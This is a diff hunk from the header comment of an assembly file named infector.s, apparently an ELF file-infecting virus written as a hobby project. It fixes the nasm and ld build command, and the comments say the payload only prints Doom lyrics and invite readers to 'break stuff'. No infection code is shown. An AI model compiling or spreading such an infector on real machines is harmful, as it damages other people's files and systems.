@@ -12,7 +12,7 @@
 ; Payload doesn't bite, just prints the lyrics to "I, dogma", the opening to the Doom (2016)     ;
 ; soundtrack, pretty random but it's a cool intro!                                               ;
 ;                                                                                                ;
-; compile with> nasm -f elf64 infector.s -o infector.o; ld -o infector infector.s                ;
+; compile with> nasm -f elf64 -o infector.o infector.s; ld -o infector infector.o                ;
 ;                                                                                                ;
 ; Same shit as the other ones, use it at your own risk and go break stuff <3                     ;
 ;                                                                                                ; 
